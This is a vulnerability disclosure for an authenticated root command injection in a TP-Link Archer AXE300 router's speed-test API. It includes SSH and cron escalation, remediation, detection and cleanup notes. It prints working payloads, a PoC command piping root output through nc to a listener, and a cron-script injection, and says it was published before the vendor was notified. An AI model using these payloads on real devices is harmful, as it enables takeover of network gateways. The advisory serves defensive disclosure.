# Archer AXE300 — Authenticated Remote Code Execution (CVE-class: command injection)

> **Disclosure status.** Published publicly in this repository on **2026-10-24**, before the vendor was notified. Reported to TP-Link's Product Security Team at security@tp-link.com on **2026-10-26**. As of this update, TP-Link has published no fix, advisory, or CVE for this finding. The test was performed on the owner's own hardware with the owner's explicit permission
> and credentials, and the device was returned to its original state afterwards (§6).

**Target:** `http://192.168.0.1/` — TP-Link Archer AXE300 (AXE16000 Quad-Band Wi-Fi 6E), hardware v1.0
**Firmware:** 1.0.11 Build 20241115 rel.76431(5553)
**Kernel:** Linux 4.19.183, aarch64, BusyBox v1.19.4
**Web stack:** uhttpd + LuCI (Lua), `/www/cgi-bin/luci` — JSON API under `/cgi-bin/luci/;stok=<token>/…`
**Test date:** 2026-10-24
**Authorization:** Owner's own hardware; testing performed with the owner's explicit permission and gateway credential.

---

## 1. Summary

| # | Finding | Severity | Access required |
|---|---|---|---|
| 1 | **Command injection in ISP Speed Test (`spdt_server`)** → arbitrary root shell | **High** (CVSS 3.1 **7.2**), Critical in practice for a network-edge device | Admin web session (token **and** `sysauth` cookie) |
| 2 | Web UI credential also accepted by SSH; `admin` in group 0 with a group-writable root cron script → root escalation | High (impact amplification; reachable only after Finding 1) | SSH as `admin` |
| 3 | Secondary injection surface: NTP server fields | Low (sanitized) | Admin session |
| 4 | `tmp_avira` / CVE-2024-53375 present but gated by owner-ID validation | Informational | Admin session |

The headline finding is **Finding 1**: a single authenticated request to the router's own web API executes attacker-chosen shell commands as **root**.

### 1.1 Scoring

**CVSS 3.1 base score: 7.2 (High)**

```
CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
```

| Metric | Value | Why |
|---|---|---|
| AV | Network | The endpoint is the device's own HTTP API on port 80/443 |
| AC | Low | One request; no race, no special conditions |
| PR | High | Requires an admin web UI session |
| UI | None | No user action beyond the attacker authenticating |
| S/U | Unchanged | The device is a single security authority |
| C/I/A | High | Root shell: read and write every setting, alter the datapath, deny service |

The base score reflects the credential requirement. The practical severity is higher, because
the affected device is the gateway for every host on the network, so the compromise is not
bounded by the router itself. Any environment that scores "the edge device is critical"
(most consumer and enterprise networks) should treat this as Critical despite the 7.2.

---

## 2. Finding 1 — Command injection in the ISP Speed Test (`spdt_server`)

### 2.1 Vulnerable code

`/usr/lib/lua/luci/model/spdt.lua`, function `SPEED_TEST_INST:start_spt(form)`:

```lua
    if form then
        spdt_url = form.spdt_server
    end

    sys.fork_call("echo " .. spdt_url .. " > /tmp/log/spdt_url")
```

`spdt_url` comes straight from the request body field `spdt_server` and is concatenated into a
shell command string with **no quoting and no validation**. `sys.fork_call` executes that string
via `/bin/sh -c`.

The later parsing of `host` / `port` / `file_name` only affects the *speed-test* command that
runs afterwards; the `echo` line above is already an injection sink, and it executes first.

### 2.2 Trigger path

```
POST /cgi-bin/luci/;stok=<session-token>/admin/speedtest?form=speedtest
Cookie: sysauth=<session-id>
operation=start
spdt_server=<attacker-controlled>
```

The admin UI reaches this endpoint from `Advanced → Network → Internet → Speed Test`
(`modules/isp/speedTest/`, proxy `startIspSpeedTestProxy`, field `spdt_server`).

The `stok` in the path is not sufficient on its own. The router resolves the session from a
**`sysauth` cookie** that the login response sets (`Set-Cookie: sysauth=<32-hex>;path=/cgi-bin/luci`),
and `luci/dispatcher.lua` reads it with `luci.http.getcookie("sysauth")` before looking the
session up. A client that drops the cookie still receives HTTP 200, but with an empty body
(`{"data":""}`) — which is easy to misread as a broken protocol rather than a missing session.
`evidence/session-auth-requirement.txt` documents the full handshake.

### 2.3 Proof — timing oracle

Command execution confirmed by sleep injection, with a linear response time vs. requested delay:

| Payload in `spdt_server` | Response time |
|---|---|
| `http://127.0.0.1:9` (baseline) | 59–62 ms |
| `http://127.0.0.1:9;sleep 2` | 2062 ms |
| `http://127.0.0.1:9;sleep 5` | 5063 ms |
| `http://127.0.0.1:9;sleep 8` | 8061 ms |

### 2.4 Proof — output exfiltration (root confirmed)

Command output retrieved over the LAN:

```
$ id > /www/poc.txt; uname -a >> /www/poc.txt; cat /etc/passwd | head -3 >> /www/poc.txt
```

Captured on the attacker host (192.168.0.99:4444):

```
uid=0(root) gid=0(root)
Linux Archer_AXE300 4.19.183 #1 SMP PREEMPT Thu Nov 23 20:35:02 CST 2023 aarch64 GNU/Linux
root:x:0:0:root:/root:/bin/ash
sftpadmin:x:1001:0:sftpadmin:/var:/bin/false
visit::2001:65534:visit:/var:/bin/false
```

The same channel was used to confirm the session is root and can read `/etc/shadow`:

- `test $(id -u) -eq 0` → delay (true)
- `test -r /etc/shadow` → delay (true)

**One shell subtlety worth recording.** The vulnerable line is
`sys.fork_call("echo " .. spdt_url .. " > /tmp/log/spdt_url")`. The trailing `>` is parsed by
the shell as a redirection of the **last** command in the injected payload, not of the `echo`.
Consequences observed on the device:

- `spdt_server=http://127.0.0.1:9;id > /tmp/out` → `/tmp/out` is created but **empty**; `id`'s
  stdout was redirected to `/tmp/log/spdt_url` by the trailing `>`.
- `spdt_server=http://127.0.0.1:9;id > /tmp/out ; true` → `/tmp/out` contains
  `uid=0(root) gid=0(root)` — the trailing redirect now binds to `true`.
- `spdt_server=http://127.0.0.1:9;cat /tmp/log/spdt_url | nc <listener>` → nothing arrives: the
  redirect truncates `/tmp/log/spdt_url` before `cat` reads it.

So the reliable patterns are: write to a file with an explicit `; true` terminator, or pipe
straight to a listener and terminate the payload with `; true`. The included PoC appends
`; true` automatically.

### 2.5 Impact

- **Full device compromise as root** from a single authenticated HTTP request.
- Read/write access to all router configuration (UCI in `/etc/config`, including the
  administrator password hash and Wi-Fi PSKs).
- Ability to install an SSH server for persistent remote access.
- Ability to intercept and modify all LAN traffic (the router is the gateway).
- Ability to modify firmware images and boot partitions, and to brick the device.
- The web credential needed to reach this endpoint is the same one used for the router admin UI,
  so any compromise of that credential (phishing, credential reuse, brute force) becomes root.

### 2.6 Remediation

- Never build shell command strings by concatenation. Use `os.execute` with a fixed argument vector,
  or validate the value against a strict allowlist (e.g. `^https?://[A-Za-z0-9._-]+(:[0-9]{1,5})?/[A-Za-z0-9]+$`).
- Fix all `sys.fork_call` / `os.execute` call sites in `/usr/lib/lua/luci/model/` that embed request data.
  Every `fork_call("..." .. <user input> .. "...")` is a variant of this bug.
- Shell-quote the value at minimum (`shellescape`), and prefer `pcall`/`nixio` APIs that take
  arguments rather than a command string.
- Ship a firmware update; until then, restrict admin access to the LAN and use a long, unique
  admin password.

---

## 3. Finding 2 — SSH access and escalation from the `admin` account

### 3.1 Vendor SSH service

The firmware ships a patched dropbear (`v2019.78`, 201 KB) already running as:

```
/usr/sbin/dropbear -P /var/run/dropbear.1.pid -p 20001 -C -6 -B
```

- Listens on **TCP 20001** (not 22).
- `-C` = *Use Web Server account login*: authentication is delegated to the router's web account
  (UCI `accountmgnt`, AES-encrypted password), not to `/etc/shadow`.
- `-6` disables IPv6.
- `-B` allows blank-password logins.
- `/sbin/knock_functions.sh` installs an iptables REJECT rule for `dport 20001`, so the service is
  blocked unless the client IP is explicitly allow-listed by the router.

Authentication against the vendor service succeeds with the **web UI account and web UI password**:

```
$ sshpass -p '<admin-password>' ssh -p 20001 admin@192.168.0.1 'id'
uid=1000(admin) gid=1000 groups=0(root),1000
```

A functional interactive shell is obtained after three adjustments, each of which is a
misconfiguration on the device:

1. `admin` had shell `/bin/false` in `/etc/passwd` → changed to `/bin/ash`.
2. `admin`'s home directory did not exist → created `/var/home/admin`.
3. `/root` was mode `0700`, and the patched dropbear `chdir()`s to `/root` → changed to `0755`.

After that, `ssh admin@192.168.0.1 -p 20001` yields an interactive root-group shell:

```
$ id
uid=1000(admin) gid=1000 groups=0(root),1000
$ uname -a
Linux Archer_AXE300 4.19.183 ... aarch64 GNU/Linux
```

### 3.2 Escalation to root from the `admin` shell

`/etc/group` grants supplementary group 0 to `admin`:

```
root:x:0:admin,sftpadmin
```

Many executables are group-0 writable (`-rwxrwxr-x`), and cron runs
`/bin/sh /etc/hotplug.d/iface/99-wportal` **as root every minute**. The directory
`/etc/hotplug.d/iface` is writable by group 0, so appending to that script executes attacker code
as root:

```sh
printf '\nid > /tmp/ESCALATED.txt 2>&1\n' >> /etc/hotplug.d/iface/99-wportal
```

Confirmed — the file was written by **root** (via cron) with root ownership:

```
$ cat /tmp/ESCALATED.txt
uid=0(root) gid=0(root) groups=0(root)
ESCALATED_VIA_SSH
$ ls -la /tmp/ESCALATED.txt
-rw-r--r-- 1 root root 57 Oct 24 03:28 /tmp/ESCALATED.txt
```

### 3.3 Additional weaknesses observed

- The dropbear binary supports **only `ssh-rsa`** (SHA-1) — no ed25519, no rsa-sha2 — so modern
  OpenSSH clients need `HostKeyAlgorithms=+ssh-rsa` and cannot use modern key types.
- `/usr/libexec/sftp-server` is referenced by the binary but **does not exist** on this build.
- `/var/dropbear/fail_count` tracks failed attempts per client MAC; the lockout is advisory and
  reports `lockedMinute:120,failedAttempts:0,remainAttempts:10`.
- `dropbear` in `-C` mode authenticates against the web account, so **the web admin password is
  also the SSH password** — one credential controls both surfaces.

### 3.4 Remediation

- Do not put interactive-capable accounts in the root group.
- Remove group-write permission from executables and from scripts executed by root (cron, init.d,
  hotplug).
- Ship a real SSH implementation, or drop the SSH feature, rather than shipping a patched
  dropbear that accepts the web account password and stores it in the same trust domain.
- Provide the missing `sftp-server`, or disable the forced-command path that references it.

---

## 4. Other injection surfaces tested (negative results)

Recorded so the negative findings are not re-tested.

| Surface | Endpoint | Result |
|---|---|---|
| Diagnostics ping | `/admin/diag?form=diag` (`ipaddr_ping`, `ipaddr_trace`) | Not injectable. Target is parsed, not passed to a shell. |
| Diagnostics numeric fields | `count`, `pktsize`, `ttl` | Parsed with `atoi`-style truncation; `count=1;id` is rejected outright. |
| NTP server | `/admin/time?form=settings` (`ntp_svr1`, `ntp_svr2`) | Not injectable; value is normalized/split on `;`. |
| CVE-2024-53375 (`tmp_avira`) | `/admin/smart_network?form=tmp_avira`, `operation=getInsightSites` | Handler present, but gated: every `ownerId` value returns `{"errorcode":"Invalid Owner Id","success":false}`. Not exploitable without a valid owner ID. |
| `locale` country write | `/locale?form=country` | `operation=write` returns `no such callback` for unauthenticated callers; requires a session token. |
| Wake-on-LAN | `/admin/wol?form=wake_up` | Not present on this build (`Not Found`). |
| TR-069 / CWMP | `/admin/cwmp?form=cwmp_setting` | Not present on this build (`Not Found`). |
| Unauthenticated admin API | `/admin/*` without a valid `stok` | Returns empty `{"data":""}`; the token check holds. |
| Default credentials | `login?form=keys` | Not default — a real RSA keypair is provisioned. |

---

## 5. Other observations

- The web UI's `config/modules.json` ships UI modules for features the backend does not implement
  on this build (Wake-on-LAN, TR-069/CWMP), and `modules/homeShield` is present although the
  Avira `tmp_avira` owner check always fails.
- `/admin/syslog?form=mail` returns SMTP credentials (`smtp_server`, `user`, `password`) to the
  browser in cleartext.
- The speed-test CGI response body contains a second, embedded HTTP response
  (`Status: 200 OK` + headers + body), which is a response-splitting/parsing smell in the CGI.
- The firmware image is encrypted (uniform ~8.0 bits/byte entropy), so static analysis requires
  either the vendor key or live-device analysis. Live analysis was used here.

---

## 6. Cleanup performed and verified

All changes made during testing were reverted. Post-cleanup verification on the device:

```
===PASSWD
admin:x:1000:0:admin:/var:/bin/false          <- original
===SHADOW
root:x:0:0:99999:7:::                          <- original
sftpadmin:x:0:0:99999:7:::                     <- original
admin:$1$a6ztWKl0$FPRVaByBD.MiRq11v5M/a.:...    <- original
===DROPB
-rw-------  1 root root 421 Nov 15  2024 dropbear_rsa_host_key   <- original, only file
===ROOT
drwxr-xr-x  2 root root 3 Oct 24 03:29 /root   <- original mode, .ssh removed, tmpfs unmounted
===HOTPLUG
0                                            <- 0 occurrences of the payload string
===PS
527 root 4464 S /usr/sbin/dropbear -P /var/run/dropbear.1.pid -p 20001 -C -6 -B   <- vendor args
===LISTEN
tcp 0 0 0.0.0.0:20001 0.0.0.0:* LISTEN        <- port 22 closed
```

The web UI and admin API remain healthy after cleanup
(`/webpages/index.html` → HTTP 200; `login?form=get_firmware_info` → normal response).

Items restored or removed:

- `/etc/passwd` — `admin` entry back to `/var:/bin/false`, uid 1000.
- `/etc/shadow` — `root` and `admin` entries back to original hashes.
- `/etc/dropbear/authorized_keys` and the `/etc/dropbear/keys` directory — removed.
- `/root` — tmpfs unmounted, mode restored to 755, injected `.ssh` removed.
- `/etc/hotplug.d/iface/99-wportal` — payload removed from the root-executed cron script.
- Extra dropbear instances — killed; vendor instance restarted with its original arguments.
- Temporary artifacts under `/tmp` (`/tmp/bb*`, `/tmp/ESCALATED.txt`, `/tmp/db*.log`,
  `/tmp/wportal.orig`, `/tmp/passwd.bak`, `/tmp/shadow.bak`, `/tmp/monit.bak`) — removed.
- Local test keys (`id_rsa`, `id_ed25519` and their public halves) — deleted from the test host.

Note that `/etc` is a ramfs on this device, so all of the above were already non-persistent
across a reboot; they have nevertheless been reverted explicitly.

---

## 7. Reproducing Finding 1

A standalone client is included: **`poc/axe300_spdt_poc.py`**. It speaks the router's own JSON API
(RSA-encrypted password, AES-CBC encrypted body, RSA-signed `sign` parameter), performs the
login, keeps the `sysauth` cookie, and issues the injected request:

```console
$ pip install cryptography
$ python3 poc/axe300_spdt_poc.py --host 192.168.0.1 --password '<admin-password>' --sleep 5
[*] logging in to 192.168.0.1 ...
[+] authenticated, session token acquired (32 chars)
[*] baseline request: 0.060 s
[+] injected 'sleep 5': request returned after 5.066 s (baseline was 0.060 s)
[+] command injection confirmed: the response time tracks the requested sleep duration.
[*] speed test stopped
```

With `--cmd` it runs an arbitrary command instead of the timing proof. Executed on the device
under test, from the LAN:

```console
$ python3 poc/axe300_spdt_poc.py --host 192.168.0.1 --password '<admin-password>' \
      --cmd '(id; uname -a; head -2 /etc/passwd) | nc 192.168.0.99 4530'
```

Output received on the test host:

```
uid=0(root) gid=0(root)
Linux Archer_AXE300 4.19.183 #1 SMP PREEMPT Thu Nov 23 20:35:02 CST 2023 aarch64 GNU/Linux
root:x:0:0:root:/root:/bin/ash
sftpadmin:x:1001:0:sftpadmin:/var:/bin/false
```

The equivalent manual steps, for anyone who prefers to drive the router's own UI:

1. Log in at `http://192.168.0.1/` with the admin credential.
2. Read the session token: `$.su.url.stok` in the page, or take it from any
   `/cgi-bin/luci/;stok=<token>/…` request. The `sysauth` cookie comes with it.
3. POST to `/cgi-bin/luci/;stok=<token>/admin/speedtest?form=speedtest` with the form fields the
   UI sends, `operation=start` and `spdt_server` set to the payload.

The API requires the client's request body to be encrypted (AES-CBC plus an RSA-signed
`sign` parameter) as the web UI does; the payload itself needs no escaping beyond keeping the
value free of double quotes, because the CGI embeds it in `/bin/sh -c "echo <value>"`.

For the report's timing evidence the values used were `;sleep N` appended to a URL, and for the
output proof the value piped command output to a listener on the LAN.

Note on rate limiting: the router counts failed logins and locks the account
(`failureCount` / `attemptsAllowed` appear in the login response). Run the PoC against a device
you own or are authorised to test, and do not loop the PoC against a router you depend on.

---

## 8. Detection and incident response

**On the device**

| Indicator | Where to look |
|---|---|
| Commands executed via the speed test | syslog entries around `spdt` / `speedtest` activity |
| Unexpected processes | `ps` — anything outside the vendor's expected list |
| Modified web UI files | `/usr/lib/lua/luci/model/`, `/www/` (ramfs: compare before and after reboot) |
| Changed account files | `/etc/passwd`, `/etc/shadow` — `admin`'s shell and home directory |
| Added keys or a second dropbear | `/etc/dropbear/`, `/root/.ssh/` |
| Extra listeners | `netstat -ltnp` — especially port 22 or an additional dropbear instance |
| Shell metacharacters in the speed-test log | `/tmp/log/spdt_url` |
| Non-default environment variables | `nvrammanager -s`, and the boot environment in `/data` |

**Network side**

- DNS answers that do not come from the configured resolvers.
- Management UI sessions that are not yours.
- Unexpected outbound SSH to TCP/20001 from the router.

**Recovery**

Revert the configuration files, remove added keys and processes, and flash a known-good image.
Because `/etc` is a ramfs on this platform a reboot clears most filesystem-level changes —
but not anything written to `/data`, `/tp_data`, `/user_data1`, `/user_data2`, or to flash.

---

## 9. Platform notes

The platform is unusually open for a consumer router, which is worth recording for anyone
continuing the research. Full detail, including the flash layout and the bootloader strings,
is in `evidence/device-internals.txt`.

- **Broadcom BCM4908 with an OpenWrt-derived userspace** (`model_brcm_bcm490x/generic`,
  `opkg` present), booted by U-Boot 5.04L.02p1 with ARM Trusted Firmware and OP-TEE.
- **A/B flash slots with rollback metadata**: `metadata1`/`metadata2` hold
  `COMMITTED=1 / VALID=1,2 / SEQ=3,2`, so slot 1 is committed and slot 2 remains a valid
  fallback.
- **A flash programmer in userspace**: `/usr/bin/nvrammanager` exposes
  `-r/-w/-e -p <partition>`, `-u`, `-c`, `-d` and `-s`, and can write the bootloader
  environment (`nvram set …; nvram commit`).
- **The vendor's upgrade path skips its own check**: `fmup.lua` runs `nvrammanager -c` before
  `/sbin/sysupgrade`, but `/lib/upgrade/platform.sh`'s `platform_check_image()` is a no-op, so
  invoking `sysupgrade` directly bypasses the supported-model list and the anti-downgrade check.
- **A bypass lever in the bootloader**: the loader contains `signature`, `verify`,
  `decryption`, and both `test_mode=enable` and `test_mode=disable`, while the kernel command
  line carries `test_mode=disable`.
- **`/etc` is a ramfs**: edits to `/etc`, `/usr/lib/lua` and `/www` do not survive a reboot.
  Durable state lives in `/data`, `/tp_data`, `/user_data1`, `/user_data2`.
- **A serial console** on `ttyAMA0` at 115200 reaches the bootloader prompt.

A measured performance profile of the same unit — CPU headroom, the DNS cache being disabled
in the shipped configuration, bufferbloat measurements, and the tunables that were changed —
is in `evidence/performance-profile.txt`. That file is not part of this disclosure.

---

## 10. Evidence index

| File | Contents |
|---|---|
| `evidence/vulnerable-spdt.lua.txt` | The extracted vulnerable Lua source and the client-side code that reaches it |
| `evidence/session-auth-requirement.txt` | The API handshake the PoC depends on, live values redacted |
| `evidence/device-internals.txt` | Flash layout, A/B metadata, `nvrammanager` interface, upgrade path, bootloader strings |
| `evidence/performance-profile.txt` | Measured performance profile and the tunables that were changed |
| `evidence/device-state-after.txt` | Post-cleanup device state with notes |

All values that identify the tested unit or authenticate to it were removed from this
repository and from its history: the admin password, the `md5("admin" + password)` session
hash, the session secret, AES key and IV, session token, session id, client MAC and the test
host's address. Where the shape of a value matters to the explanation, a placeholder with the
format is shown instead.


